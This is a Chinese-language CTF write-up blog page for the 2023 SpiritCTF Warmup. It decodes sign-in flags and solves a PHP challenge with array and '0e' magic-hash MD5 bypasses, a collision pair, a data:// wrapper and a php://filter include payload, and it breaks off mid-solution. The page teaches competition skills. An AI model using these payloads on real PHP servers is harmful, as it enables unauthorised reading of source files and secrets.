@@ -1,0 +1,1661 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>2023 SpiritCTF Warmup WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">2023 SpiritCTF Warmup WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2023-10-17
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/php/" title="PHP">
+                      #PHP
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/sql/" title="SQL">
+                      #SQL
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/python/" title="Python">
+                      #Python
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/c/" title="C#">
+                      #C#
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h1 id="比赛介绍"><a href="#比赛介绍" class="headerlink" title="比赛介绍"></a>比赛介绍</h1><blockquote>
+<p>2023 SpiritCTF Warmup <span class="hexo-wm">ꜱ​³ⅴℯ𝐧•‍𝐬𝘪‌tｅ​</span>为 2023 SpiritCTF 热身赛<br>属于 吉林大学“山石网科”杯第五届<span class="hexo-wm">s‍‍³ⅴℯ𝒏．‌𝘀ⅈ‌﻿𝐭ｅ﻿‌</span>大学生网络安全竞赛 系列赛事<br>比赛时间为 2023/9/5 - 2023/10/17</p>
+</blockquote>
+<h1 id="热身赛与正赛"><a href="#热身赛与正赛" class="headerlink" title="热身赛与正赛"></a>热身赛与正赛</h1><ul>
+<li>热身赛题目包括但不限于各个方向的入门题目、与本次 2023 <span class="hexo-wm">𝐬‍⑶𝘷𝘦𝘯∙‌​𝘴ｉ‍ｔe‍</span>SpiritCTF 难度相当的题目、往年SpiritCTF（校赛）的题目，用于帮助大家有针对性的入门</li>
+<li>热身赛期间成绩突出的同学将被定向邀请至 2023 SpiritCTF 线下赛场（注：线下赛场与线上赛场采用同样的比赛地址解答相同题目，不过线下赛场更能体会到 CTF <span class="hexo-wm">𝘴​‌³vｅｎ.﻿‍𝘴𝘪‍​𝘵𝐞​﻿</span>的比赛氛围，并且入围线下赛场的同学可以获得 Spirit 战队的精美周边）</li>
+<li>线下赛场名额上限为 45 ，热身赛总榜靠前、<span class="hexo-wm">𝒔​​3𝘷𝐞𝘯∙​𝒔𝐢‍ｔ𝐞‌</span>解出某道难度较高热身赛题给出题人留下深刻印象都有可能被定向邀请到线下赛场</li>
+<li>正赛于十月下旬开始，<span class="hexo-wm">𝘴​𝟯𝒗ｅn•‍si‌‍𝒕e﻿</span>模式为组队赛（三人一队）</li>
+</ul>
+<h1 id="Signin1"><a href="#Signin1" class="headerlink" title="Signin1"></a>Signin1</h1><p>题目描述：</p>
+<blockquote>
+<p>App1e_Tree在赛前七天倒计时海报中的三张使用不同编码隐藏了一个flag，你能找到它么！<br>请移步SpiritGame <span class="hexo-wm">s﻿‌𝟯𝒗e𝘯．﻿‌𝒔𝘪﻿​tｅ​</span>2023赛事群 <span class="hexo-wm">𝒔‌3ve𝘯·‌si‌t℮‍‍</span>143102236 精华消息中获取海报，关注比赛实时动态！</p>
+</blockquote>
+<p>三张海报中中含<span class="hexo-wm">s‍3v𝘦ｎ∙​𝘀i‌ｔ𝐞﻿‌</span>有的信息如下</p>
+<p>1.仅剩2天海报</p>
+<blockquote>
+<p>Spirit{that_1s<span class="hexo-wm">𝒔​⑶𝒗ℯｎ•‍ѕ𝐢﻿𝘵𝐞​</span>_the_fun_0f_ctf_</p>
+</blockquote>
+<p>2.仅剩4天海报</p>
+<blockquote>
+<p>5F396F30645F6C7<span class="hexo-wm">ѕ‍‍⑶𝐯𝘦𝘯.‌‍𝘴ⅈ‍𝒕𝘦‌﻿</span>5636B5F747730<span class="hexo-wm">s​‌3ⅴ℮n.​﻿ѕｉ‌𝐭𝘦﻿‌</span>5F755F62795F30766572663130777D</p>
+</blockquote>
+<p>3.仅剩7天海报</p>
+<blockquote>
+<p>\u006e\u0065\u0076\u0065\u0072\u005f\<span class="hexo-wm">ѕ‌﻿³v𝘦n·<span class="hexo-wm">𝒔‌³𝒗ｅ𝐧∙‍ꜱ𝐢​𝒕e‌</span>‍​𝐬𝐢‌ｔ𝐞​‌</span>u0067\u0031\u0076\u0065\u005f\u0075\u0070</p>
+</blockquote>
+<p>根据信息内容判断</p>
+<ul>
+<li>1 为明文</li>
+<li>2 为字符密文</li>
+<li>3 为unicode密文</li>
+</ul>
+<p>1 为明文，即有</p>
+<pre class="language-none"><code class="language-none">Spirit{that_1s_the_fun_0f_ctf_</code></pre>
+<p>2 通过 <a href="https://www.toolhelper.cn/EncodeDecode/EncodeDecode">字符在线加解密工具</a> 解密后获得</p>
+<pre class="language-none"><code class="language-none">_9o0d_luck_tw0_u_by_0verf10w}</code></pre>
+<p>3 通过 <a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChineseEncodeDecode">Unicode在<span class="hexo-wm">ꜱ‍﻿𝟯vℯ𝘯.﻿‍𝘴i‌‌𝘵℮‌‌</span>线加解密工具</a> 解密后获得</p>
+<pre class="language-none"><code class="language-none">never_g1ve_up</code></pre>
+<p>根据 <code>flag</code> 格式 <code>Spirit{xxxx}</code> 推测应为132组合</p>
+<p>Flag:</p>
+<pre class="language-none"><code class="language-none">Spirit{that_1s_the_fun_0f_ctf_never_g1ve_up_9o0d_luck_tw0_u_by_0verf10w}</code></pre>
+
+<h1 id="Signin2"><a href="#Signin2" class="headerlink" title="Signin2"></a>Signin2</h1><p>纯纯签到题</p>
+<p>题目描述：</p>
+<blockquote>
+<p>Welcome to <a href="mailto:web@spirit2023.ctf">web@spirit2023.ctf</a>~</p>
+</blockquote>
+<p>打开页面后发现有一个 <code>Get Your Flag</code> 按钮</p>
+<p><img src="image-1.png" alt="image-1.png"></p>
+<p>然而点击后没有什么反应（？）</p>
+<h2 id="1-方法一：DevTools-curl"><a href="#1-方法一：DevTools-curl" class="headerlink" title="1. 方法一：DevTools + curl"></a>1. 方法一：DevTools + curl</h2><p>F12打开开发人员工具，<span class="hexo-wm">𝘴​​𝟯𝐯ℯｎ·‍‌ѕⅈ‌​𝘵𝘦‌</span>调至网络选项卡，开启记录网络日志并刷新页面，选项卡内容显示如下：</p>
+<p><img src="image-2.png" alt="image-2.png"></p>
+<p>点击 <code>Get Your Flag</code> 按钮后，网络选项卡显<span class="hexo-wm">ѕ‍³𝘷𝐞𝘯•‌𝒔𝘪﻿‍ｔ℮‍</span>示内容变化为如下：</p>
+<p><img src="image-3.png" alt="image-3.png"></p>
+<p>发现新增了一行 <code>flag</code> 通信包，于是<span class="hexo-wm">s﻿‌³𝘷ｅｎ∙‌﻿si‌𝘵e‍﻿</span>推测该按钮发送了 <code>/flag</code> 请求，</p>
+<p>并根据选项卡显示<span class="hexo-wm">ꜱ​﻿𝟯𝘷ℯｎ•﻿𝒔𝘪‌​𝒕℮​</span>内容判断页面经过了 <code>301重定向</code></p>
+<p>于是使用 <code>curl</code> 工具：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/flag</code></pre>
+<p>返回内容如下</p>
+<pre class="language-none"><code class="language-none">HTTP/1.1 301 Moved Permanently
+Flag: U3Bpcml0ezQ4NDY0YzNlLTJhMGQtNDVhNC04NTE4LWFlZTJhZDg5NDM4Y30=
+Location: /
+Server: Microsoft-NetCore/2.0
+Date: xxxxxxx
+Transfer-Encoding: chunked</code></pre>
+<p>由此获得经过加密后的 <code>Flag</code> 信息</p>
+<pre class="language-none"><code class="language-none">Flag: U3Bpcml0ezk1YTkyYTkwLTYyMTMtNGRmMC05MjE2LTU4M2YwMGZmMjdlM30=</code></pre>
+<h2 id="2-方法二：Burp-Suite"><a href="#2-方法二：Burp-Suite" class="headerlink" title="2. 方法二：Burp Suite"></a>2. 方法二：Burp Suite</h2><p>打开 <code>Burp Suite</code> 开启浏览器流量代理<br><img src="image-4.png" alt="image-4.png"><br>发现该按钮指向 <code>/flag</code> 路径并被301重定向</p>
+<p>在 <code>/flag</code> 路径的 <code>Response</code> 中发现 <code>Flag</code> 信息如下：</p>
+<pre class="language-none"><code class="language-none">Flag: U3Bpcml0ezk1YTkyYTkwLTYyMTMtNGRmMC05MjE2LTU4M2YwMGZmMjdlM30=</code></pre>
+<h2 id="3-Flag-解密"><a href="#3-Flag-解密" class="headerlink" title="3. Flag 解密"></a>3. Flag 解密</h2><p>结合该字符串形式，判断flag经过了Base64加密<br>使用<a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在线加解密工具</a><br><img src="image-5.png" alt="image-5.png"><br>即可获得flag如下</p>
+<blockquote>
+<p>Spirit{95a92a90-6213-<span class="hexo-wm">𝘀​‍³ⅴe𝐧．‍‍<span class="hexo-wm">ѕ‍﻿𝟯𝒗ｅn．​ꜱｉ‌​𝒕℮‍</span>ꜱ𝐢​​𝐭℮‌</span>4df0-9216-583f00ff27e3}</p>
+</blockquote>
+<h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><p>题目描述：</p>
+<blockquote>
+<p>\/\/PHPは最<span class="hexo-wm">ѕ​﻿3ⅴeｎ∙﻿𝐬<span class="hexo-wm">𝘴﻿‍³ⅴ𝘦𝐧.‌𝐬𝘪‍​𝘵𝘦​</span>ｉ‌‌𝘵e‌‌</span>高~\/\/</p>
+<p>for hackers</p>
+</blockquote>
+<p>打开页面发现题<span class="hexo-wm">𝘴‌‌³ve𝒏.‍s𝘪‌𝘵𝐞‌</span>目给出了一段<code>php</code>代码如下：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna give you up'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna let you down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna run around and desert you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Never gonna make you cry'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna say goodbye'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Never gonna tell a lie and hurt you'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span></code></pre>
+<p><del>你被骗啦（误）</del></p>
+<p>接下来对代码的各<span class="hexo-wm">s​‌𝟯ⅴe𝒏∙﻿​ѕｉ‌﻿𝐭ｅ‌﻿</span>个部分进行分析</p>
+<h2 id="1-第一部分"><a href="#1-第一部分" class="headerlink" title="1. 第一部分"></a>1. 第一部分</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna give you up'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>此处判断是否通过<code>GET</code>方式传入 <code>a</code> 和 <code>b</code> 两个arg</p>
+<p>如果任意一个参数没有传入 <span class="hexo-wm">ѕ﻿‌⑶𝐯𝘦𝘯·​s𝐢﻿‍𝘵𝘦‌</span>则终止运行并抛出</p>
+<blockquote>
+<p>Never gonna <span class="hexo-wm">𝘴​‍𝟯𝐯ℯn∙‌‌ѕⅈ﻿𝐭ｅ​</span>give you up</p>
+</blockquote>
+<p>因此可以通过页面回显判断<span class="hexo-wm">ѕ‍‍𝟯ⅴ𝘦𝒏∙‍‌𝘴i‌​𝐭℮‌</span>代码运行到的位置</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna let you down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>此处代码接收 <code>a</code> &amp; <code>b</code> 两个arg的值</p>
+<p>并只有在</p>
+<blockquote>
+<ul>
+<li><code>a</code> 不等于 <code>b</code></li>
+<li><code>a</code> 的MD5值与 <code>b</code> 相等时</li>
+</ul>
+</blockquote>
+<p>才能通过检测</p>
+<p>否则终止运行并抛出</p>
+<blockquote>
+<p>Never gonna <span class="hexo-wm">ѕ‌⑶𝒗ｅ𝘯．​𝐬<span class="hexo-wm">ѕ‌​⑶vｅｎ․‌‌ѕｉ​﻿te﻿</span>i​t℮‍‌</span>let you down</p>
+</blockquote>
+<p>此处常见的绕过方式有：</p>
+<ul>
+<li>构造非字符串参数绕过 <span class="hexo-wm">𝐬​﻿𝟯𝒗𝘦ｎ·‍‌ꜱ𝐢﻿𝘵℮​</span>(仅限于旧版本PHP)</li>
+<li>利用弱类型特性0e绕过</li>
+<li>直接使用md5碰撞</li>
+</ul>
+<h3 id="1-1-构造非字符串参数绕过-仅限于旧版本PHP"><a href="#1-1-构造非字符串参数绕过-仅限于旧版本PHP" class="headerlink" title="1.1 构造非字符串参数绕过 (仅限于旧版本PHP)"></a>1.1 构造非字符串参数绕过 (仅限于旧版本PHP)</h3><blockquote>
+<p>已知旧版本PHP在调用 <code>md5</code> 函数时如果传入的参数为非字符串类型，会直接返回NULL</p>
+</blockquote>
+<p>利用这一特性，我们可以通过构造 <code>a</code> 和 <code>b</code> 两个不同的非字符串参数<br>使得”NULL=NULL”成立来绕过这一检测</p>
+<p>例如我们可以使用<span class="hexo-wm">𝐬‍​³𝘷ℯｎ·﻿‌𝒔i‌𝘵𝐞‌</span>数组类型绕过</p>
+<blockquote>
+<p>a=[]=1&amp;<span class="hexo-wm">𝘀​³ⅴｅｎ.<span class="hexo-wm">s​3ve𝘯․‌ѕ𝐢‌‍t𝘦​​</span>‍‌𝒔𝘪‌﻿ｔ𝐞﻿</span>b=[]=2</p>
+</blockquote>
+<h3 id="1-2-利用弱类型特性0e绕过"><a href="#1-2-利用弱类型特性0e绕过" class="headerlink" title="1.2 利用弱类型特性0e绕过"></a>1.2 利用弱类型特性0e绕过</h3><blockquote>
+<p>由于PHP的弱类型特性，若 <code>md5</code> 函数返回的字符串以 <code>0e</code> 开头，会被PHP识别为科学<span class="hexo-wm">𝘴‍³𝐯ℯ𝘯∙﻿​𝐬ⅈ‍‍te‍‌</span>计数法，将其值转化为0</p>
+</blockquote>
+<p>因此只需要 <code>a</code> 和 <code>b</code> 不相同且经过 <code>md5</code> 加密后的密文都以 <code>0e</code> 开头即可</p>
+<p>常见的符合条件的字符串如下：</p>
+<blockquote>
+<ul>
+<li>QNKCDZO</li>
+<li>240610708</li>
+<li>s878926199a</li>
+<li>s155964671a</li>
+<li>s214587387a</li>
+<li>s214587387a</li>
+</ul>
+</blockquote>
+<p>在其中任意选择并赋给 <code>a</code> &amp; <code>b</code> 即可</p>
+<h3 id="1-3-直接使用md5碰撞"><a href="#1-3-直接使用md5碰撞" class="headerlink" title="1.3 直接使用md5碰撞"></a>1.3 直接使用md5碰撞</h3><blockquote>
+<p>此方法亦可用于”<span class="hexo-wm">𝐬​3vℯｎ∙﻿ѕi﻿ｔe‌</span>===”强类型碰撞，<span class="hexo-wm">𝘴﻿﻿⑶𝘷𝐞𝒏·﻿𝘴𝐢‌𝘵ｅ‌</span>旨在寻找含有相同md5值的不同字符串</p>
+</blockquote>
+<p>经查找后可以找到如下 <code>a</code> &amp; <code>b </code>满足条件：</p>
+<pre class="language-none"><code class="language-none">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
+<h2 id="2-第二部分"><a href="#2-第二部分" class="headerlink" title="2. 第二部分"></a>2. 第二部分</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna run around and desert you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Never gonna make you cry'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Never gonna say goodbye'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>此处判断是否通过 <code>GET</code> 方式传入了arg <code>c</code> ，</p>
+<p>然后使用 <code>file_get_contents</code> 函数读取 <code>c</code>，</p>
+<p>将读取结果与 <code>Never gonna make you cry</code> 比对</p>
+<p>若比对失败则终<span class="hexo-wm">𝐬﻿³ve𝒏․‍‍ѕ𝘪‌t℮​﻿</span>止运行并抛出</p>
+<blockquote>
+<p>Never gonna <span class="hexo-wm">s﻿​³𝐯𝐞𝐧．‍‍<span class="hexo-wm">𝐬‌﻿3𝐯𝐞𝒏．‍﻿𝒔i‌‍ｔ℮​</span>𝘀𝘪‌​𝐭e﻿﻿</span>say goodbye</p>
+</blockquote>
+<p>由于此处用到了<span class="hexo-wm">𝐬‌﻿3𝐯ℯ𝒏．﻿﻿ꜱｉ​‍ｔ𝐞‍‌</span>文件读取函数 <code>file_get_contents</code></p>
+<p>因此考虑使用 <code>data://</code> 伪协议绕过</p>
+<blockquote>
+<p>data://text/plain,<span class="hexo-wm">s‌𝟯𝐯ℯ𝘯•‍​<span class="hexo-wm">𝘴‌​3𝒗ℯｎ∙‍s𝐢‌‌𝒕℮​﻿</span>𝒔ⅈ﻿𝒕e‌‌</span>(string)</p>
+</blockquote>
+<p>因此将arg <code>c</code> 赋值为 <code>data://text/plain,Never gonna make you cry</code></p>
+<h2 id="3-第三部分"><a href="#3-第三部分" class="headerlink" title="3. 第三部分"></a>3. 第三部分</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Never gonna tell a lie and hurt you'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
+<p>最后一处代码将arg <code>d</code> 的默认值设置为 <code>flag.php</code> ，提示我们在 <code>flag.php</code> 中寻找线索</p>
+<blockquote>
+<p>但是我们如果直接将这种含有PHP代码的文件的文件名传入<code>include</code>函数，<br>就会由于PHP代码被执行<span class="hexo-wm">𝘴​𝟯𝘷eｎ•<span class="hexo-wm">𝐬​3𝐯ℯ𝘯∙‌‍ꜱi‌𝐭𝐞‍‍</span>‍‌𝘴𝐢​​𝐭e‌</span>而无法通过可视文本的形式泄露</p>
+</blockquote>
+<p>因此想到使用PHP伪协议的 <code>Filter</code> ，把代码内容经过ba<span class="hexo-wm">𝘴​‍³ⅴｅ𝐧.﻿‍𝘀i‌​tｅ﻿​</span>se64加密后再进行输出</p>
+<p><code>d=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p>得到输出内容如下</p>
+<pre class="language-none"><code class="language-none">PD9waHAKJGZsYWcgPSAkX0VOVlsnRkxBRyddID8/ICdTcGlyaXR7ZmFrZS1mbGFnLXF3cX0nOwpmaWxlX3B1dF9jb250ZW50cygnc3Bpcml0ZmxhZ3F3cScsICRmbGFnKTsK</code></pre>
+<p>经过 <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在<span class="hexo-wm">𝘀​𝟯𝐯℮ｎ.‌ꜱｉ‍‌t𝘦‌‍</span>线加解密工具</a> 解密后得到</p>
